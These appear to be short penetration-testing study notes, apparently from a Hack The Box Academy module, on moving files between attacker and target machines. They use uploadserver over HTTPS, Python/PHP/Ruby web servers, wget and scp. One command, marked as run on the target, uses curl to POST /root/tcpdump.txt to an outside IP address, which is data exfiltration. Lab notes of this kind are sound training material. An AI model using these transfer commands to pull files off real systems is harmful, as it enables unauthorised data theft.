![](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)

==Web Upload with uploadserver==
```bash
# Create self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# Create directory for web server
mkdir https && cd https  
# Start HTTPS server
sudo uploadserver 443 --server-certificate ~/server.pem  
```

```bash
# Target
curl -X POST http://10.10.15.253:8080/upload -F 'files=@/root/tcpdump.txt' --insecure
```

==Web Servers==
```bash
# Target
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

==Upload Using SCP==
```bash
scp agent riley@painters.htb:/home/riley/
```

